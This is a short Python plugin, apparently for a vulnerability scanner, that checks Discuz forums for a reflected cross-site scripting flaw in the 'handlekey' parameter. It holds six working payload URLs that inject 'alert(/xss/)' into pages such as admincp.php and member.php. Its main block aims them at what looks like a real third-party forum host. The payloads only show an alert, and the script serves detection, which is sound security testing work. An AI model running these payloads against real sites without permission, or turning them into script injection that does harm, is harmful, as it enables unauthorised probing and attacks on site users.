import re
def assign(service,arg):
    if service == 'discuz':
        return True,arg
def audit(arg):
        
        payloads = [
            'admincp.php?infloat=yes&handlekey=123);alert(/xss/);//',
            'ajax.php?infloat=yes&handlekey=123);alert(/xss/);//',
            'announcement.php?infloat=yes&handlekey=123);alert(/xss/);//',
            'attachment.php?infloat=yes&handlekey=123);alert(/xss/);//',
            'member.php?infloat=yes&handlekey=123);alert(/xss/);//',
            'post.php?action=reply&fid=17&tid=1591&extra=&replysubmit=yes&infloat=yes&handlekey=123);alert(/xss/);//'
            ]
        for payload in payloads:
            url = arg + payload;
            code,head,res,_,_ = curl.curl(url)
            if code == 200 and 'alert(/xss/);//' in res:
                security_warning(url)

if __name__ == '__main__':
        from dummy import *
        audit(assign('discuz','http://bbs.knight.iccgame.com/')[1])
        
    
